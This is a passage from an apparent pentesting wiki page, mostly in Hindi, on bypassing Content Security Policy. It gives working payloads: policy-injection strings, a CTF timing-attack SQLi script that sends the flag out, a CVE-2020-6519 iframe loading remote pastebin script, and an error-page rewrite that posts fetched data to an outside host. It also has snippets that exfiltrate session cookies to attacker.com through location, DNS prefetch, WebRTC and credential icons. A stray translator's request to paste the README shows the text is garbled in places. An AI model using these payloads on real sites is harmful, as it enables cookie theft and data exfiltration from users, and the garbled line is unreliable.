../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Research:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

यदि आपके द्वारा भेजा गया कोई **parameter** policy की **declaration** के अंदर **pasted inside** किया जा रहा है, तो आप किसी तरह से उस **policy** को **alter** करके इसे बेकार बना सकते हैं। आप इन bypasses में से किसी का उपयोग करके **allow script 'unsafe-inline'** करवा सकते हैं:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
क्योंकि यह निर्देश **overwrite existing script-src directives** करेगा.\
आप उदाहरण यहाँ देख सकते हैं: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Edge में यह बहुत आसान है। यदि आप CSP में केवल इसको जोड़ सकें: **`;_`**, तो **Edge** पूरी **policy** को **drop** कर देगा.\
Example: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Time attack

निर्देश `'unsafe-inline'` की कमी पर ध्यान दें.\
इस बार आप victim को `<iframe>` के साथ **XSS** के जरिए एक पेज **load** करने के लिए मजबूर कर सकते हैं जो **your control** में है। इस बार आप victim को उस पेज तक पहुँचाने वाले हैं जहाँ से आप जानकारी निकालना चाहते हैं (**CSRF**)। आप पेज के content तक access नहीं कर सकते, लेकिन अगर किसी तरह आप पेज के load होने में लगने वाले समय को **control the time the page needs to load** कर सकें तो आप आवश्यक जानकारी निकाल सकते हैं।

इस बार एक **flag** निकाला जाएगा — जब भी SQLi के जरिए कोई **char is correctly guessed**, तो sleep function की वजह से **response** को **more time** लगेगा। फिर आप flag निकाल पाएँगे:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Bookmarklets के माध्यम से

यह attack कुछ social engineering शामिल करता है जहाँ attacker **उपयोगकर्ता को ब्राउज़र के bookmarklet पर एक लिंक drag\&drop करने के लिए मनाता है**। यह bookmarklet में **malicious javascript** code होगा जो जब drag\&dropped या क्लिक किया जाएगा तो वर्तमान वेब विंडो के context में execute होगा, **CSP को bypass करते हुए और cookies या tokens जैसे संवेदनशील जानकारी चुराने की अनुमति देगा**।

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP को सीमित करके bypass

In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP को bypass किया गया है जब एक allowed iframe के अंदर एक अधिक restrictive CSP inject किया गया जो एक specific JS file को load होने से रोकता था और फिर वह file, **prototype pollution** या **dom clobbering** के माध्यम से, **abuse a different script to load an arbitrary script** करने की अनुमति देता था।

आप **Iframe की CSP को सीमित कर सकते हैं** **`csp`** attribute के साथ:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
In [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), में, **HTML injection** के माध्यम से यह संभव था कि **CSP** को और अधिक **सीमित** किया जाए ताकि CSTI को रोकने वाला एक script disabled हो जाए और इसलिए **vulnerability became exploitable.**\  
CSP को और अधिक सख्त बनाया जा सकता है **HTML meta tags** का उपयोग करके और inline scripts को disabled किया जा सकता है **removing** उस **entry** को जो उनके **nonce** को अनुमति देता है और कुछ inline script को **enable specific inline script via sha**:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration Content-Security-Policy-Report-Only के साथ

अगर आप किसी तरह सर्वर को हेडर **`Content-Security-Policy-Report-Only`** के साथ प्रतिक्रिया देने में सक्षम हो जाएँ और वह **value आपके नियंत्रण में हो** (शायद CRLF के कारण), तो आप इसे अपने सर्वर की ओर पॉइंट करा सकते हैं और अगर आप उस **JS content** को जिसे आप exfiltrate करना चाहते हैं **`<script>`** से **wrap** करते हैं और चूँकि बहुत संभव है कि CSP में `unsafe-inline` allowed नहीं है, तो यह **trigger a CSP error** करेगा और script का वह हिस्सा (जिसमें संवेदनशील जानकारी हो) `Content-Security-Policy-Report-Only` के माध्यम से सर्वर पर भेज दिया जाएगा।

For an example [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking Information with CSP and Iframe

- एक `iframe` बनाया जाता है जो एक URL की ओर इशारा करता है (इसे `https://example.redirect.com` कहें) जिसे CSP द्वारा अनुमति दी गई है।
- यह URL फिर एक गुप्त URL (उदा., `https://usersecret.example2.com`) पर redirect कर देता है, जिसे CSP द्वारा **अनुमति नहीं** है।
- `securitypolicyviolation` इवेंट को सुनकर, आप `blockedURI` property को पकड़ सकते हैं। यह property blocked URI के domain का खुलासा करती है, जिससे प्रारंभिक URL जिस गुप्त domain पर redirect हुआ था वह leak हो जाता है।

ध्यान देने योग्य है कि Chrome और Firefox जैसे browsers CSP के संदर्भ में iframes को हैंडल करते समय अलग व्यवहार दिखाते हैं, जो undefined behavior के कारण संवेदनशील जानकारी के संभावित leak का कारण बन सकता है।

एक और तकनीक CSP का स्वयं उपयोग करके गुप्त subdomain का अनुमान लगाने से संबंधित है। यह तरीका एक binary search algorithm पर निर्भर करता है और CSP को समायोजित करके उन specific domains को शामिल करने पर जिसका जानबूझकर block किया गया हो। उदाहरण के लिए, यदि गुप्त subdomain अनजान characters से बना है, तो आप CSP directive को modify कर के इन subdomains को block या allow करके अलग-अलग subdomains को क्रमिक रूप से test कर सकते हैं। नीचे एक snippet दिया गया है जो दिखाता है कि इस method को सुविधाजनक बनाने के लिए CSP कैसे सेट किया जा सकता है:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
CSP द्वारा कौन‑से requests ब्लॉक या अनुमति किए जा रहे हैं इसे मॉनिटर करके, आप secret subdomain में संभावित characters को सीमित कर सकते हैं और अंततः पूरा URL उजागर कर सकते हैं।

दोनों तरीके CSP की implementation और ब्राउज़रों में उसके व्यवहार की नाज़ुकियों का फायदा उठाते हैं, दिखाते हुए कि कैसे जाहिरा तौर पर सुरक्षित नीतियाँ अनजाने में संवेदनशील जानकारी leak कर सकती हैं।

Trick from [**here**](https://ctftime.org/writeup/29310).

## CSP बायपास करने के लिए असुरक्षित तकनीकें

### PHP Errors when too many params

[**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM) के अनुसार, बहुत अधिक parameters भेजने (1001 GET parameters — हालाँकि आप इसे POST params और 20 से अधिक files के साथ भी कर सकते हैं) से trigger होने वाली error के कारण PHP वेब कोड में परिभाषित किसी भी **`header()`** को **send नहीं किया जाएगा**।

### PHP response buffer overload

PHP डिफ़ॉल्ट रूप से response को **4096** bytes तक buffer करने के लिए जाना जाता है। इसलिए, अगर PHP कोई warning दिखा रहा है, warnings के अंदर पर्याप्त डेटा देने से **response** **CSP header** से **पहले** **send** हो जाएगा, जिससे header ignore हो जाएगा.  
फिर, यह technique मूलतः **response buffer को warnings से भरने** पर आधारित है ताकि CSP header भेजा न जाए।

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Kill CSP via max_input_vars (headers already sent)

क्योंकि headers को किसी भी output से पहले भेजा जाना चाहिए, PHP द्वारा उत्पन्न warnings बाद के `header()` कॉल्स को अमान्य कर सकते हैं। यदि user input `max_input_vars` से अधिक हो जाता है, तो PHP पहले एक startup warning फेंकता है; इसके बाद कोई भी `header('Content-Security-Policy: ...')` “headers already sent” के साथ fail हो जाएगा, जिससे प्रभावी रूप से CSP disable हो जाता है और अन्यथा blocked reflective XSS की अनुमति मिल जाती है।
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
कृपया src/pentesting-web/content-security-policy-csp-bypass/README.md की सामग्री यहाँ पेस्ट करें — मैं इसे Markdown/HTML टैग्स अपरिवर्तित रखते हुए अंग्रेज़ी से हिंदी में अनुवाद कर दूँगा।
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Rewrite Error Page

इस [**this writeup**](https://blog.ssrf.kr/69) से ऐसा लगता है कि एक error page (संभवतः बिना CSP के) को लोड करके और उसके कंटेंट को rewrite करके CSP protection को bypass करना संभव था।
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME एक तकनीक है जो XSS (या बहुत सीमित XSS) का दुरुपयोग करके किसी पेज के endpoint में मौजूद कमी का फायदा उठाकर उसी origin के अन्य endpoints का दुरुपयोग करने के लिए प्रयोग की जाती है। यह vulnerable endpoint को एक attacker page से लोड करके और फिर attacker page को उसी same origin के real endpoint पर refresh करके किया जाता है जिसे आप दुरुपयोग करना चाहते हैं। इस तरह vulnerable endpoint payload में मौजूद `opener` object का उपयोग करके real endpoint के DOM तक पहुँच कर उसे दुरुपयोग कर सकता है। अधिक जानकारी के लिए देखें:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Moreover, **wordpress** has a **JSONP** endpoint in `/wp-json/wp/v2/users/1?_jsonp=data` that will **reflect** the **data** sent in the output (with the limitation of only letter, numbers and dots).

एक attacker उस endpoint का दुरुपयोग करके WordPress के खिलाफ एक SOME attack जेनरेट कर सकता है और उसे `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` के अंदर embed कर सकता है। ध्यान दें कि यह **script** लोड होगी क्योंकि यह **allowed by 'self'** है। Moreover, and because WordPress is installed, an attacker might abuse the **SOME attack** through the **vulnerable** **callback** endpoint that **bypasses the CSP** to give more privileges to a user, install a new plugin...\
For more information about how to perform this attack check [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

If there is a strict CSP that doesn't allow you to **interact with external servers**, there are some things you can always do to exfiltrate the information.

### Location

You could just update the location to send to the attacker's server the secret information:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

आप meta tag inject करके redirect कर सकते हैं (यह सिर्फ़ एक redirect है, यह content को leak नहीं करेगा)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

पेजों को तेज़ी से लोड करने के लिए, ब्राउज़र होस्टनेम को पहले से IP पतों में रेज़ॉल्व करते हैं और उन्हें बाद के उपयोग के लिए कैश कर लेते हैं.\
आप ब्राउज़र को किसी होस्टनेम को पहले से रेज़ॉल्व करने के लिए संकेत दे सकते हैं: `<link rel="dns-prefetch" href="something.com">`

आप इस व्यवहार का दुरुपयोग करके **exfiltrate sensitive information via DNS requests** कर सकते हैं:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
एक और तरीका:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
इसे होने से रोकने के लिए सर्वर निम्न HTTP header भेज सकता है:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> ऐसा प्रतीत होता है कि यह तकनीक headless browsers (bots) में काम नहीं करती

### WebRTC

कई पृष्ठों पर आप पढ़ सकते हैं कि **WebRTC CSP की `connect-src` नीति की जाँच नहीं करता है**.

वास्तव में आप _leak_ जानकारी को एक _DNS request_ के माध्यम से बाहर निकाल सकते हैं। इस कोड को देखें:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
एक और विकल्प:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

credential popup पृष्ठ द्वारा प्रतिबंधित किए बिना iconURL पर एक DNS अनुरोध भेजता है। यह केवल सुरक्षित संदर्भ (HTTPS) या localhost पर ही काम करता है।
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## CSP नीतियों की ऑनलाइन जाँच

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## CSP को स्वचालित रूप से बनाना

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## संदर्भ

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
